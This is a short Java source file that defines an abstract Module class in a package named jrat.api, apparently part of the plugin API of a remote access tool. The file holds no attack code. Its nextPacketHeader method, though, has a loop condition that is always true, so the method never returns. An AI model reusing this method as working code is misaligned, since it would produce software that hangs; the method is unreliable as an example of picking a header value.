package jrat.api;

import java.util.Random;

public abstract class Module {

    /**
     * The common name of this module
     */
    private String name;

    /**
     * The random seed assigned to this module,
     * used when deciding packet header range
     */
    private int seed;

    public Module(int seed) {
        this.seed = seed;
    }

    public Module(String name, int seed) {
        this(seed);
        this.name = name;
    }

    public abstract void init();

    protected short nextPacketHeader() {
        short header;

        Random rnd = new Random(this.seed);
        do {
            header = (short) rnd.nextInt();
        } while (header > 0 || header < 100);

        return header;
    }
}
